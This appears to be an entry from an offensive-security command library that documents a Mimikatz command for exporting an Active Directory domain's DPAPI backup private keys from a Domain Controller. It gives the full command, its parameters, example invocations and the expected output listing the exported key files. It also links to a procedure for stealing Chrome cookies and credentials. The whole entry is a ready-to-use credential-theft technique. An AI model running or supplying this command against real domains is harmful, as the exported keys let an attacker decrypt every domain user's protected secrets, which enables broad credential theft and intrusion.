---
type: command
executor: command_prompt
data: >-
  mimikatz.exe "lsadump::backupkeys /system:$_DOMAIN_CONTROLLER.$_DOMAIN
  /export" "exit"
tags:
  - credential-access
  - dpapi
  - active-directory
platforms:
  - Windows
verified: true
validated: true
---

# mimikatz-export-domain-private-key

## Command

```command_prompt
mimikatz.exe "lsadump::backupkeys /system:$_DOMAIN_CONTROLLER.$_DOMAIN /export" "exit"
```

## Description

Exports the domain's LSA private keys (including RSA and legacy keys) from a Domain Controller using Mimikatz's lsadump module. Requires Domain Admin privileges and targets the system hive to backupkeys for offline use in DPAPI decryption.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_DOMAIN_CONTROLLER | FQDN of the Domain Controller (e.g., dc01.example.com) | Yes |
| $_DOMAIN | Domain name (e.g., example.com) | Yes |
| /system | Specifies the remote system to target | Yes |
| /export | Enables export of keys to files in current directory | Yes |

## Examples

### Basic Usage

```command_prompt
mimikatz.exe "lsadump::backupkeys /system:dc01.example.com /export" "exit"
```

### Advanced Usage

Run interactively: mimikatz.exe, then lsadump::backupkeys /system:dc01.example.com /export

## Expected Output

Mimikatz banner followed by key details:

Current prefered key: {GUID}
  * RSA key
        Private export : OK - 'ntds_capi_0_{GUID}.keyx.rsa.pvk'

Compatibility prefered key: {GUID}
  * Legacy key
        Export : OK - 'ntds_legacy_0_{GUID}.key'

Files exported to current directory for use in masterkey decryption.

## Related

- [[procedures/Extract-Chrome-Cookies-and-Credentials-from-User-Profile-with-Domain-Admin]]
- [[tools/Mimikatz]]
